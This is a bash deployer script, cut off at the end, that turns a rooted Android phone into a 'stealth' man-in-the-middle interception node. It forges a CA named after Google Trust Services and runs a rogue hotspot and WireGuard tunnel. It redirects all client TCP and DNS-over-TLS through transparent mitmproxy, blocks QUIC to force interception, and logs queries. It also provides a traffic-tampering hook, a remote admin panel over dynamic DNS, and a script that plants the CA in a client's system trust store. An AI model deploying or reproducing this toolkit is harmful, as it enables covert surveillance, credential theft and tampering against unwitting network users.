#!/system/bin/env bash
set -euo pipefail

# ============================================================================
#  Stealth MITM Proxy – Enhanced Robust Deployer
#  Run once as root on your Motorola. All configuration is saved in
#  $BASE_DIR/config.sh and can be reloaded at any time.
# ============================================================================

# ---------- configuration block ----------
PROXY_PORT=8080
MITMWEB_PORT=8081
WEBUI_HTTPS_PORT=9443
PROXY_USER="admin"
PROXY_PASS="ChangeMe!23"
WEBUI_USER="admin"
WEBUI_PASS="ChangeMe!23"
DUCKDNS_TOKEN="your-token"
NOIP_USER="your-noip-user"
NOIP_PASS="your-noip-pass"
HOST1="pet-my.duckdns.org"
HOST2="suck.sytes.net"
HOTSPOT_SSID="StealthNet"
HOTSPOT_PASS="StrongHotspotPassword"
ENABLE_WG=1
WG_PORT=51820
WG_SERVER_IP="10.9.0.1"
WG_CLIENT_IP="10.9.0.2"
BASE_DIR="/data/local/tmp/mitm_stealth"
# ------------------------------------------

# ------------------------- robustness helpers -------------------------------
die() { echo "FATAL: $*" >&2; exit 1; }
warn() { echo "WARN: $*" >&2; }
info() { echo "[*] $*"; }

# check root
[ "$(id -u)" -ne 0 ] && die "Run as root."

# check basic commands
for cmd in id grep sed awk; do
    command -v "$cmd" >/dev/null 2>&1 || die "Required command '$cmd' not found."
done

# check for internet (optional, to download packages)
if ping -c1 -W2 1.1.1.1 >/dev/null 2>&1; then
    HAS_INTERNET=1
    info "Internet connectivity: OK"
else
    HAS_INTERNET=0
    warn "No internet detected. Assuming all dependencies are already installed."
fi

# create base dirs with safe permissions
mkdir -p "$BASE_DIR"/{certs,scripts,logs,nginx,wireguard,bin}
chmod 755 "$BASE_DIR" "$BASE_DIR"/{certs,scripts,logs,nginx,wireguard,bin}

# ---------------- install dependencies (skip if no internet) -----------------
if [ "$HAS_INTERNET" -eq 1 ]; then
    info "Installing system packages..."
    if command -v apt >/dev/null 2>&1; then
        apt update -y -q && apt upgrade -y -q || warn "apt update/upgrade failed, continuing..."
        apt install -y -q python python-pip dnsmasq nginx curl openssl \
            hostapd iptables iproute2 wireguard-tools tsu procps coreutils 2>&1 | tail -5
    elif command -v pkg >/dev/null 2>&1; then
        # Termux style
        pkg update -y && pkg upgrade -y
        pkg install -y python dnsmasq nginx curl openssl iptables iproute2 wireguard-tools tsu procps coreutils
    else
        warn "No package manager found. Ensure required packages are installed manually."
    fi

    # Python dependencies
    info "Installing Python packages..."
    pip install --upgrade pip -q || true
    pip install mitmproxy Flask flask-httpauth dnslib -q || warn "pip install failed, some features may not work"
else
    warn "Skipping package installation (offline mode)."
fi

# verify critical binaries after installation
for bin in dnsmasq nginx openssl iptables; do
    command -v "$bin" >/dev/null 2>&1 || warn "Binary '$bin' not found – related services may fail."
done
command -v mitmweb >/dev/null 2>&1 || warn "mitmweb not found. Install mitmproxy manually."
python3 -c "import dnslib" 2>/dev/null || warn "Python module 'dnslib' missing; DoT proxy will fail."

# ---------- create proxy user (idempotent) -----------------------------------
if ! id proxy &>/dev/null; then
    info "Creating proxy user..."
    if command -v useradd >/dev/null 2>&1; then
        useradd -M -s /bin/false proxy || warn "useradd failed, falling back to manual entry"
        if ! id proxy &>/dev/null; then
            # manual fallback
            echo "proxy:x:9999:9999::/nonexistent:/bin/false" >> /etc/passwd
            echo "proxy:x:9999:" >> /etc/group
        fi
    else
        echo "proxy:x:9999:9999::/nonexistent:/bin/false" >> /etc/passwd
        echo "proxy:x:9999:" >> /etc/group
    fi
else
    info "Proxy user already exists."
fi

# ---------- CA generation (preserve existing) --------------------------------
if [ -f "$BASE_DIR/certs/mitmproxy-ca-cert.pem" ] && [ -f "$BASE_DIR/certs/mitmproxy-ca-key.pem" ]; then
    warn "CA certificates already exist. Keeping existing ones."
else
    info "Generating CA..."
    openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
      -keyout "$BASE_DIR/certs/mitmproxy-ca-key.pem" \
      -out "$BASE_DIR/certs/mitmproxy-ca-cert.pem" \
      -subj "/C=US/O=Google Trust Services/CN=GTS CA 1O1" 2>/dev/null || die "CA generation failed"
    openssl x509 -in "$BASE_DIR/certs/mitmproxy-ca-cert.pem" \
      -outform DER -out "$BASE_DIR/certs/mitmproxy-ca.der" 2>/dev/null
    chmod 644 "$BASE_DIR"/certs/mitmproxy-ca-cert.pem
    chmod 600 "$BASE_DIR"/certs/mitmproxy-ca-key.pem
fi
# always ensure restrictive permissions on the private key
[ -f "$BASE_DIR/certs/mitmproxy-ca-key.pem" ] && chmod 600 "$BASE_DIR/certs/mitmproxy-ca-key.pem"

# ---------- upstream interface detection (with timeout) ----------------------
UPSTREAM_IFACE=""
if command -v ip >/dev/null 2>&1; then
    UPSTREAM_IFACE=$(timeout 2 ip route get 8.8.8.8 2>/dev/null | awk 'NR==1 {print $5}' | tr -d '[:space:]') || true
fi
[ -z "$UPSTREAM_IFACE" ] && UPSTREAM_IFACE="rmnet_data0"
info "Upstream interface: $UPSTREAM_IFACE"

# ---------- firewall script (with variable ports) ----------------------------
FW_SCRIPT="$BASE_DIR/scripts/firewall.sh"
cat > "$FW_SCRIPT" << 'FWEOF'
#!/system/bin/env bash
set -euo pipefail
UPSTREAM_IFACE="%UPSTREAM_IFACE%"
PROXY_PORT=%PROXY_PORT%

# enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo "WARN: Cannot enable ip_forward" >&2

# flush existing rules (ignore errors)
iptables -t nat -F 2>/dev/null || true
iptables -F 2>/dev/null || true

# redirect all TCP from internal interfaces -> proxy
for iface in wlan0 wg0; do
    iptables -t nat -A PREROUTING -i "$iface" -p tcp -j REDIRECT --to-port "$PROXY_PORT" 2>/dev/null || true
done

# DNS plain + DoT
for iface in wlan0 wg0; do
    iptables -t nat -A PREROUTING -i "$iface" -p udp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null || true
    iptables -t nat -A PREROUTING -i "$iface" -p tcp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null || true
    iptables -t nat -A PREROUTING -i "$iface" -p tcp --dport 853 -j REDIRECT --to-port 853 2>/dev/null || true
    # Drop QUIC (udp/443) to force HTTPS over TCP
    iptables -A FORWARD -i "$iface" -p udp --dport 443 -j DROP 2>/dev/null || true
    iptables -A INPUT -i "$iface" -p udp --dport 443 -j DROP 2>/dev/null || true
done

# NAT outgoing traffic
iptables -t nat -A POSTROUTING -o "$UPSTREAM_IFACE" -j MASQUERADE 2>/dev/null || true

# exempt proxy user from redirection (avoid loops)
PROXY_UID=$(id -u proxy 2>/dev/null || echo 9999)
iptables -t nat -A OUTPUT -m owner --uid-owner "$PROXY_UID" -j ACCEPT 2>/dev/null || true

# block external access to internal proxy ports
for port in "$PROXY_PORT" 853 5353; do
    iptables -A INPUT -i "$UPSTREAM_IFACE" -p tcp --dport "$port" -j DROP 2>/dev/null || true
done

# Log dropped packets for debugging (optional)
# iptables -A INPUT -i "$UPSTREAM_IFACE" -p tcp --dport 443 -j LOG --log-prefix "MITM-BLOCK: " 2>/dev/null || true
FWEOF

sed -i "s/%UPSTREAM_IFACE%/$UPSTREAM_IFACE/g; s/%PROXY_PORT%/$PROXY_PORT/g" "$FW_SCRIPT"
chmod +x "$FW_SCRIPT"

# ---------- dnsmasq config ---------------------------------------------------
DNSMASQ_CONF="$BASE_DIR/dnsmasq.conf"
if [ -f "$DNSMASQ_CONF" ]; then
    warn "dnsmasq.conf already exists. Backing up to ${DNSMASQ_CONF}.bak"
    cp "$DNSMASQ_CONF" "${DNSMASQ_CONF}.bak"
fi
cat > "$DNSMASQ_CONF" << DEOF
no-resolv
server=8.8.8.8
server=1.1.1.1
listen-address=0.0.0.0
port=5353
cache-size=2000
log-queries
log-facility=$BASE_DIR/logs/dnsmasq.log
interface=wlan0
dhcp-range=192.168.42.10,192.168.42.250,12h
dhcp-option=3,192.168.42.1
DEOF

# ---------- hostapd config (generated if hotspot is enabled) -----------------
if [ "${ENABLE_HOTSPOT:-1}" -eq 1 ]; then
    HOSTAPD_CONF="$BASE_DIR/hostapd.conf"
    if [ ! -f "$HOSTAPD_CONF" ]; then
        info "Creating hostapd configuration..."
        cat > "$HOSTAPD_CONF" << HOSTAPDEOF
interface=wlan0
driver=nl80211
ssid=${HOTSPOT_SSID}
hw_mode=g
channel=6
wpa=2
wpa_passphrase=${HOTSPOT_PASS}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
auth_algs=1
macaddr_acl=0
ignore_broadcast_ssid=0
HOSTAPDEOF
        chmod 600 "$HOSTAPD_CONF"
    else
        info "hostapd.conf already exists. Keeping existing."
    fi
fi

# ---------- DoT proxy (preserve if exists) -----------------------------------
DOT_PROXY="$BASE_DIR/scripts/dot_proxy.py"
if [ -f "$DOT_PROXY" ]; then
    warn "DoT proxy script already exists. Keeping existing."
else
    cat > "$DOT_PROXY" << 'DOTEOF'
#!/usr/bin/env python3
import ssl, socket, struct, logging, sys, select, os
from concurrent.futures import ThreadPoolExecutor
try:
    from dnslib import DNSRecord
except ImportError:
    print("dnslib not installed. DoT proxy will not log queries.", file=sys.stderr)

LISTEN_PORT=853
UPSTREAM=("1.1.1.1", 853)
CERT="/data/local/tmp/mitm_stealth/certs/mitmproxy-ca-cert.pem"
KEY="/data/local/tmp/mitm_stealth/certs/mitmproxy-ca-key.pem"
LOG="/data/local/tmp/mitm_stealth/logs/dot_proxy.log"
logging.basicConfig(filename=LOG, level=logging.INFO,
                    format="%(asctime)s [DoT] %(message)s")
executor = ThreadPoolExecutor(max_workers=20)

def relay(client, addr):
    tls_client = tls_up = None
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(CERT, KEY)
        tls_client = ctx.wrap_socket(client, server_side=True)
        usock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        usock.settimeout(10)
        ctx_up = ssl.create_default_context()
        tls_up = ctx_up.wrap_socket(usock, server_hostname="1.1.1.1")
        tls_up.connect(UPSTREAM)
        socks = [tls_client, tls_up]
        while True:
            r, _, _ = select.select(socks, [], [], 30)
            if tls_client in r:
                data = tls_client.recv(4096)
                if not data: break
                if len(data) > 2:
                    try:
                        q = DNSRecord.parse(data[2:])
                        logging.info(f"Query: {q.q.qname} from {addr}")
                    except: pass
                tls_up.sendall(data)
            if tls_up in r:
                data = tls_up.recv(4096)
                if not data: break
                tls_client.sendall(data)
    except Exception as e:
        logging.error(f"Relay error: {e}")
    finally:
        for s in (tls_client, tls_up):
            try: s.close()
            except: pass

def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", LISTEN_PORT))
    srv.listen(10)
    logging.info("DoT proxy started on port %d", LISTEN_PORT)
    while True:
        cl, addr = srv.accept()
        executor.submit(relay, cl, addr)

if __name__ == "__main__":
    main()
DOTEOF
    chmod +x "$DOT_PROXY"
fi

# ---------- mitmproxy launcher (ports from config) ---------------------------
MITM_LAUNCHER="$BASE_DIR/scripts/run_mitmproxy.sh"
cat > "$MITM_LAUNCHER" << MITMPROXY
#!/system/bin/env bash
cd $BASE_DIR
exec mitmweb \\
  --mode transparent \\
  --listen-port ${PROXY_PORT} \\
  --web-host 127.0.0.1 --web-port ${MITMWEB_PORT} \\
  --web-auth "${PROXY_USER}:${PROXY_PASS}" \\
  --ssl-insecure \\
  -s $BASE_DIR/scripts/tamper_script.py \\
  --set script_watch=true \\
  --certs $BASE_DIR/certs/mitmproxy-ca-cert.pem \\
  --key-size 4096 \\
  >> $BASE_DIR/logs/mitmproxy.log 2>&1
MITMPROXY
chmod +x "$MITM_LAUNCHER"

# ---------- tamper script (preserve user customizations) ---------------------
TAMPER_SCRIPT="$BASE_DIR/scripts/tamper_script.py"
if [ -f "$TAMPER_SCRIPT" ]; then
    warn "Tamper script already exists. Backing up to ${TAMPER_SCRIPT}.bak"
    cp "$TAMPER_SCRIPT" "${TAMPER_SCRIPT}.bak"
else
    cat > "$TAMPER_SCRIPT" << 'TAMPER'
from mitmproxy import http, ctx

def request(flow: http.HTTPFlow) -> None:
    # Custom request modification example:
    # if "example.com" in flow.request.host:
    #     flow.request.headers["X-Injected"] = "true"
    pass

def response(flow: http.HTTPFlow) -> None:
    # Custom response modification example:
    # if flow.response and flow.response.status_code == 200:
    #     flow.response.text = flow.response.text.replace("old", "new")
    pass
TAMPER
fi

# ---------- Flask admin UI (Nginx handles auth; no duplicate Flask login) ---
ADMIN_UI="$BASE_DIR/scripts/admin_ui.py"
if [ -f "$ADMIN_UI" ]; then
    warn "Admin UI script already exists. Keeping existing."
else
    cat > "$ADMIN_UI" << 'FLASKUI'
import os, subprocess, sys, json, traceback
from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify, send_file
import base64

BASE="/data/local/tmp/mitm_stealth"
TAMPER=BASE+"/scripts/tamper_script.py"
SECRET_FILE=BASE+"/nginx/.flask_secret"
os.makedirs(os.path.dirname(SECRET_FILE), exist_ok=True)
if not os.path.exists(SECRET_FILE):
    with open(SECRET_FILE,'wb') as f: f.write(os.urandom(24))
with open(SECRET_FILE,'rb') as f: secret = f.read()

app=Flask(__name__)
app.secret_key=secret

HTML_TEMPLATE="""
<!DOCTYPE html>
<html>
<head><title>Stealth MITM Panel</title>
<style>
body{font-family:Arial; margin:20px; background:#111; color:#eee;}
a{color:#4af;}
.tabcontent{display:none; padding:10px; border:1px solid #444; border-top:none; background:#222;}
.tab{overflow:hidden; border:1px solid #444; background-color:#333;}
.tab button{background-color:inherit; float:left; border:none; outline:none; cursor:pointer;
  padding:14px 16px; transition:0.3s; color:#ccc;}
.tab button:hover{background-color:#555;}
.tab button.active{background-color:#222; color:white;}
pre{white-space:pre-wrap; word-wrap:break-word; background:#000; padding:10px; max-height:300px; overflow:auto;}
</style></head>
<body>

<h2>Stealth MITM Proxy</h2>
<div class="tab">
  <button class="tablinks" onclick="openTab(event,'Status')" id="defaultOpen">Status</button>
  <button class="tablinks" onclick="openTab(event,'Tamper')">Tamper Script</button>
  <button class="tablinks" onclick="openTab(event,'Logs')">Logs</button>
  <button class="tablinks" onclick="openTab(event,'Actions')">Actions</button>
</div>

<div id="Status" class="tabcontent">
  <h3>Service Status</h3>
  <pre id="status_data">Loading...</pre>
</div>

<div id="Tamper" class="tabcontent">
  <h3>Edit Tamper Script</h3>
  <form method="post" action="/update_tamper">
    <textarea name="tamper_code" rows="20" cols="100" style="background:#000;color:#0f0;">{{ tamper_content }}</textarea><br>
    <input type="submit" value="Save & Reload">
  </form>
  <p style="color:red">{{ tamper_error }}</p>
</div>

<div id="Logs" class="tabcontent">
  <h3>Recent Logs</h3>
  <pre id="log_data">Loading...</pre>
</div>

<div id="Actions" class="tabcontent">
  <h3>Control</h3>
  <button onclick="fetch('/restart_proxy')">Restart mitmproxy</button>
  <button onclick="fetch('/restart_dns')">Restart DNS</button>
  <button onclick="fetch('/restart_all')">Restart All</button>
</div>

<script>
function openTab(evt, tabName) {
  var i, tabcontent, tablinks;
  tabcontent = document.getElementsByClassName("tabcontent");
  for (i=0; i<tabcontent.length; i++) tabcontent[i].style.display = "none";
  tablinks = document.getElementsByClassName("tablinks");
  for (i=0; i<tablinks.length; i++) tablinks[i].className = tablinks[i].className.replace(" active","");
  document.getElementById(tabName).style.display = "block";
  if(evt) evt.currentTarget.className += " active";
  if(tabName=="Status") loadStatus();
  if(tabName=="Logs") loadLogs();
}
function loadStatus(){
  fetch('/api/status')
    .then(r=>r.text())
    .then(t=>{ document.getElementById('status_data').textContent = t; });
}
function loadLogs(){
  fetch('/api/logs')
    .then(r=>r.text())
    .then(t=>{ document.getElementById('log_data').textContent = t; });
}
document.getElementById("defaultOpen").click();
</script>
</body></html>
"""

@app.route('/')
def index():
    try:
        with open(TAMPER,'r') as f:
            tamper = f.read()
    except:
        tamper = "# Error reading tamper script"
    return render_template_string(HTML_TEMPLATE, tamper_content=tamper, tamper_error="")

@app.route('/update_tamper', methods=['POST'])
def update_tamper():
    code = request.form.get('tamper_code','')
    try:
        compile(code, TAMPER, 'exec')
        with open(TAMPER,'w') as f:
            f.write(code)
        return redirect(url_for('index'))
    except SyntaxError as e:
        with open(TAMPER,'r') as f:
            current = f.read()
        return render_template_string(HTML_TEMPLATE, tamper_content=current,
                                      tamper_error=f"Syntax error: {e}")
    except Exception as e:
        with open(TAMPER,'r') as f:
            current = f.read()
        return render_template_string(HTML_TEMPLATE, tamper_content=current,
                                      tamper_error=f"Error: {e}")

@app.route('/api/status')
def api_status():
    out = []
    for svc in ['mitmweb','dnsmasq','nginx','dot_proxy.py']:
        pidof = subprocess.run(['pidof',svc], capture_output=True, text=True)
        out.append(f"{svc}: {'running' if pidof.returncode==0 else 'stopped'}")
    return '\n'.join(out)

@app.route('/api/logs')
def api_logs():
    log_files = [BASE+'/logs/mitmproxy.log', BASE+'/logs/dnsmasq.log', BASE+'/logs/run_all.log']
    lines=[]
    for log in log_files:
        if os.path.exists(log):
            try:
                with open(log,'r') as f:
                    content = f.readlines()[-50:]
                    lines.append(f"--- {os.path.basename(log)} ---")
                    lines.extend(content)
            except:
                pass
    return ''.join(lines)

@app.route('/restart_proxy')
def restart_proxy():
    subprocess.run(['pkill','-f','mitmweb'], capture_output=True)
    subprocess.Popen(['su','-s','/bin/bash','proxy','-c',BASE+'/scripts/run_mitmproxy.sh'])
    return "mitmproxy restart triggered"

@app.route('/restart_dns')
def restart_dns():
    subprocess.run(['pkill','dnsmasq'], capture_output=True)
    subprocess.Popen(['dnsmasq','-C',BASE+'/dnsmasq.conf'])
    return "dnsmasq restart triggered"

@app.route('/restart_all')
def restart_all():
    subprocess.run([BASE+'/bin/mitm-ctl','stop'], capture_output=True)
    subprocess.Popen([BASE+'/bin/mitm-ctl','start'])
    return "Full restart triggered"

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
FLASKUI
    chmod +x "$ADMIN_UI"
fi

# ---------- Nginx reverse proxy (with self-signed cert) ----------------------
if [ ! -f "$BASE_DIR/certs/webui-cert.pem" ] || [ ! -f "$BASE_DIR/certs/webui-key.pem" ]; then
    info "Generating Web UI certificate..."
    if openssl req -x509 -nodes -days 3650 -newkey rsa:2048 \
      -keyout "$BASE_DIR/certs/webui-key.pem" \
      -out "$BASE_DIR/certs/webui-cert.pem" \
      -subj "/CN=${HOST1}" -addext "subjectAltName=DNS:${HOST1},DNS:${HOST2}" 2>/dev/null; then
        : # success
    else
        cat > /tmp/ssl_mitm.conf << SSLCONF
[req]
distinguished_name=req_distinguished_name
x509_extensions=v3_req
prompt=no
[req_distinguished_name]
CN=${HOST1}
[v3_req]
subjectAltName=@alt_names
[alt_names]
DNS.1=${HOST1}
DNS.2=${HOST2}
SSLCONF
        openssl req -x509 -nodes -days 3650 -newkey rsa:2048 \
          -keyout "$BASE_DIR/certs/webui-key.pem" \
          -out "$BASE_DIR/certs/webui-cert.pem" \
          -config /tmp/ssl_mitm.conf 2>/dev/null || die "SSL certificate generation failed"
        rm -f /tmp/ssl_mitm.conf
    fi
    chmod 600 "$BASE_DIR/certs/webui-key.pem"
else
    info "Web UI certificate exists."
fi

# htpasswd file
if [ ! -f "$BASE_DIR/nginx/.htpasswd" ]; then
    echo "${WEBUI_USER}:$(openssl passwd -apr1 "${WEBUI_PASS}")" > "$BASE_DIR/nginx/.htpasswd"
fi

# Nginx config
cat > "$BASE_DIR/nginx/nginx.conf" << NGXEOF
worker_processes 1;
pid ${BASE_DIR}/nginx/nginx.pid;
error_log ${BASE_DIR}/logs/nginx_error.log;
events { worker_connections 32; }
http {
    access_log ${BASE_DIR}/logs/nginx_access.log;
    server {
        listen ${WEBUI_HTTPS_PORT} ssl;
        ssl_certificate     ${BASE_DIR}/certs/webui-cert.pem;
        ssl_certificate_key ${BASE_DIR}/certs/webui-key.pem;
        auth_basic "Stealth Panel";
        auth_basic_user_file ${BASE_DIR}/nginx/.htpasswd;

        location /mitmweb/ {
            proxy_pass http://127.0.0.1:${MITMWEB_PORT}/;
            proxy_http_version 1.1;
            proxy_set_header Upgrade \$http_upgrade;
            proxy_set_header Connection "upgrade";
        }
        location / {
            proxy_pass http://127.0.0.1:5000/;
        }
        location /ca.der {
            alias ${BASE_DIR}/certs/mitmproxy-ca.der;
            add_header Content-Type application/x-x509-ca-cert;
        }
        location /bootstrap {
            alias ${BASE_DIR}/scripts/bootstrap_client.sh;
            add_header Content-Type text/plain;
        }
    }
}
NGXEOF

# ---------- Client bootstrap script (port adjusted) --------------------------
cat > "$BASE_DIR/scripts/bootstrap_client.sh" << 'BOOTSTRAP'
#!/system/bin/env bash
# Run on a rooted Android client connected to this proxy network.
set -e
echo "[*] Downloading MITM CA..."
curl -sk https://192.168.42.1:9443/ca.der -o /data/local/tmp/mitm-ca.der
if [ -f /data/local/tmp/mitm-ca.der ]; then
    hash=$(openssl x509 -inform DER -in /data/local/tmp/mitm-ca.der -subject_hash_old -noout 2>/dev/null)
    if [ -z "$hash" ]; then
        echo "Failed to compute hash. Is openssl installed?"
        exit 1
    fi
    mount -o remount,rw /system 2>/dev/null || true
    cp /data/local/tmp/mitm-ca.der /system/etc/security/cacerts/${hash}.0
    chmod 644 /system/etc/security/cacerts/${hash}.0
    mount -o remount,ro /system 2>/dev/null || true
    echo "[+] CA installed. Reboot recommended."
else
    echo "Download failed. Check connectivity."
    exit 1
fi
BOOTSTRAP
sed -i "s/9443/${WEBUI_HTTPS_PORT}/g" "$BASE_DIR/scripts/bootstrap_client.sh"
chmod +x "$BASE_DIR/scripts/bootstrap_client.sh"

# ---------- WireGuard setup (idempotent) -------------------------------------
if [ "$ENABLE_WG" -eq 1 ]; then
    info "Configuring WireGuard..."
    mkdir -p "$BASE_DIR/wireguard"
    cd "$BASE_DIR/wireguard"
    if [ ! -f server_private.key ]; then
        wg genkey > server_private.key
        wg pubkey < server_private.key > server_public.key
    fi
    if [ ! -f client_private.key ]; then
        wg genkey > client_private.key
        wg pubkey < client_private.key > client_public.key
    fi
    cat > wg0.conf << WGCONF
[Interface]
Address=${WG_SERVER_IP}/24
ListenPort=${WG_PORT}
PrivateKey=$(cat server_private.key)
PostUp=iptables -t nat -A PREROUTING -i wg0 -p tcp -j REDIRECT --to-port ${PROXY_PORT}
PostUp=iptables -t nat -A PREROUTING -i wg0 -p udp --dport 53 -j REDIRECT --to-port 5353
PostUp=iptables -t nat -A PREROUTING -i wg0 -p tcp --dport 53 -j REDIRECT --to-port 5353
PostUp=iptables -t nat -A PREROUTING -i wg0 -p tcp --dport 853 -j REDIRECT --to-port 853
PostUp=iptables -A FORWARD -i wg0 -p udp --dport 443 -j DROP
PostDown=iptables -t nat -D PREROUTING -i wg0 -p tcp -j REDIRECT --to-port ${PROXY_PORT} 2>/dev/null || true
PostDown=iptables -t nat -D PREROUTING -i wg0 -p udp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null || true
PostDown=iptables -t nat -D PREROUTING -i wg0 -p tcp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null || true
PostDown=iptables -t nat -D PREROUTING -i wg0 -p tcp --dport 853 -j REDIRECT --to-port 853 2>/dev/null || true
PostDown=iptables -D FORWARD -i wg0 -p udp --dport 443 -j DROP 2>/dev/null || true

[Peer]
PublicKey=$(cat client_public.key)
AllowedIPs=${WG_CLIENT_IP}/32
WGCONF
    cat > client.conf << CLIENTCONF
[Interface]
PrivateKey=$(cat client_private.key)
Address=${WG_CLIENT_IP}/24
DNS=${WG_SERVER_IP}

[Peer]
PublicKey=$(cat server_public.key)
Endpoint=${HOST1}:${WG_PORT}
AllowedIPs=0.0.0.0/0
PersistentKeepalive=25
CLIENTCONF
    cd "$BASE_DIR"
fi

# ---------- DDNS updater (enhanced placeholder implementation) ---------------
DDNS_SCRIPT="$BASE_DIR/scripts/update_ddns.sh"
if [ "$DUCKDNS_TOKEN" != "your-token" ] || [ "$NOIP_USER" != "your-noip-user" ]; then
    info "Setting up DDNS updater with provided credentials..."
    cat > "$DDNS_SCRIPT" << 'DDNSSH'
#!/system/bin/env bash
set -euo pipefail
BASE=/data/local/tmp/mitm_stealth
LOG="$BASE/logs/ddns.log"
mkdir -p "$(dirname "$LOG")"

log() { echo "$(date '+%F %T') $*" >> "$LOG"; }

get_ip() {
    for s in ifconfig.me icanhazip.com ipinfo.io/ip; do
        IP=$(curl -sk --max-time 5 "https://$s" 2>/dev/null || true)
        if [[ "$IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo "$IP"
            return
        fi
    done
    echo ""
}

update_duckdns() {
    if [ "${DUCKDNS_TOKEN}" = "your-token" ] || [ -z "${DUCKDNS_TOKEN}" ]; then
        return
    fi
    local domains="${HOST1%%.*}"
    local url="https://www.duckdns.org/update?domains=${domains}&token=${DUCKDNS_TOKEN}&ip=${CURRENT_IP}"
    local resp
    resp=$(curl -sk --max-time 10 "$url" 2>/dev/null || true)
    log "DuckDNS update: $resp"
}

update_noip() {
    if [ "${NOIP_USER}" = "your-noip-user" ] || [ -z "${NOIP_USER}" ]; then
        return
    fi
    local resp
    resp=$(curl -sk --max-time 10 -u "${NOIP_USER}:${NOIP_PASS}" \
        "https://dynupdate.no-ip.com/nic/update?hostname=${HOST2}&myip=${CURRENT_IP}" 2>/dev/null || true)
    log "No-IP update: $resp"
}

while true; do
    CURRENT_IP=$(get_ip)
    if [ -z "$CURRENT_IP" ]; then
        log "ERROR: Could not determine public IP."
        sleep 300
        continue
    fi
    log "Current IP: $CURRENT_IP"
    update_duckdns
    update_noip
    sleep 300
done
DDNSSH
    chmod +x "$DDNS_SCRIPT"
else
    cat > "$DDNS_SCRIPT" << 'DDNSNOOP'
#!/system/bin/env bash
exit 0
DDNSNOOP
    chmod +x "$DDNS_SCRIPT"
    info "DDNS tokens are placeholders; updater will be inactive."
fi

# ---------- Write runtime config file for run_all.sh (including DDNS vars) ---
RUNTIME_CFG="$BASE_DIR/runtime.conf"
cat > "$RUNTIME_CFG" << RUNTIMECFG
# Auto-generated runtime configuration – sourced by run_all.sh
export BASE_DIR="$BASE_DIR"
export PROXY_PORT="$PROXY_PORT"
export MITMWEB_PORT="$MITMWEB_PORT"
export WEBUI_HTTPS_PORT="$WEBUI_HTTPS_PORT"
export HOTSPOT_SSID="$HOTSPOT_SSID"
export HOTSPOT_PASS="$HOTSPOT_PASS"
export ENABLE_HOTSPOT="${ENABLE_HOTSPOT:-1}"
export ENABLE_WG="${ENABLE_WG:-1}"
export DUCKDNS_TOKEN="$DUCKDNS_TOKEN"
export HOST1="$HOST1"
export HOST2="$HOST2"
export NOIP_USER="$NOIP_USER"
export NOIP_PASS="$NOIP_PASS"
# additional variables for firewall & DDNS scripts
export UPSTREAM_IFACE="$UPSTREAM_IFACE"
RUNTIMECFG
chmod 644 "$RUNTIME_CFG"

# ---------- Master runner (robust watchdog) ----------------------------------
cat > "$BASE_DIR/scripts/run_all.sh" << 'RUNALL'
#!/system/bin/env bash
set -euo pipefail

# source runtime configuration
if [ -f "/data/local/tmp/mitm_stealth/runtime.conf" ]; then
    source "/data/local/tmp/mitm_stealth/runtime.conf"
fi

# fallback defaults if not set
BASE="${BASE_DIR:-/data/local/tmp/mitm_stealth}"
LOG="$BASE/logs/run_all.log"
mkdir -p "$BASE/logs"

log() { echo "$(date '+%F %T') $*" >> "$LOG"; }

# --------- hotspot -----------
if [ "${ENABLE_HOTSPOT:-1}" -eq 1 ]; then
    log "Starting hotspot..."
    svc wifi disable 2>/dev/null || true
    if command -v hostapd >/dev/null && [ -f "$BASE/hostapd.conf" ]; then
        hostapd -B "$BASE/hostapd.conf" 2>&1 | tee -a "$LOG"
    else
        cmd wifi start-softap "${HOTSPOT_SSID:-StealthNet}" wpa2 "${HOTSPOT_PASS:-StrongHotspotPassword}" 2>&1 | tee -a "$LOG"
    fi
    sleep 2
    ifconfig wlan0 192.168.42.1 netmask 255.255.255.0 2>/dev/null || true
    dnsmasq -C "$BASE/dnsmasq.conf" 2>&1 | tee -a "$LOG"
fi

# --------- firewall ----------
log "Applying firewall rules..."
"$BASE/scripts/firewall.sh" >> "$LOG" 2>&1

# --------- WireGuard ---------
if [ "${ENABLE_WG:-1}" -eq 1 ] && [ -f "$BASE/wireguard/wg0.conf" ]; then
    log "Starting WireGuard..."
    wg-quick up "$BASE/wireguard/wg0.conf" 2>&1 | tee -a "$LOG" || log "WG start failed"
fi

# ---------- Dot proxy (watchdog) ----------
(
    while true; do
        log "Starting DoT proxy..."
        python3 "$BASE/scripts/dot_proxy.py" >> "$LOG" 2>&1
        log "DoT proxy exited, restarting in 5s..."
        sleep 5
    done
) &

# ---------- mitmproxy (watchdog, run as proxy user) ----------
(
    while true; do
        log "Starting mitmproxy..."
        if command -v su >/dev/null; then
            su -s /bin/bash proxy -c "$BASE/scripts/run_mitmproxy.sh" 2>&1 | tee -a "$LOG"
        elif command -v runuser >/dev/null; then
            runuser -u proxy "$BASE/scripts/run_mitmproxy.sh" 2>&1 | tee -a "$LOG"
        else
            sudo -u proxy "$BASE/scripts/run_mitmproxy.sh" 2>&1 | tee -a "$LOG"
        fi
        log "mitmproxy exited, restarting in 5s..."
        sleep 5
    done
) &

# ---------- Flask admin ----------
(
    while true; do
        log "Starting admin UI..."
        python3 "$BASE/scripts/admin_ui.py" >> "$LOG" 2>&1
        sleep 3
    done
) &

# ---------- Nginx ----------
log "Starting nginx..."
nginx -c "$BASE/nginx/nginx.conf" >> "$LOG" 2>&1

# ---------- DDNS updater ----------
if [ -x "$BASE/scripts/update_ddns.sh" ]; then
    nohup "$BASE/scripts/update_ddns.sh" >> "$LOG" 2>&1 &
fi

# ---------- simple log rotation ----------
(
    while true; do
        sleep 3600
        for f in "$BASE"/logs/*.log; do
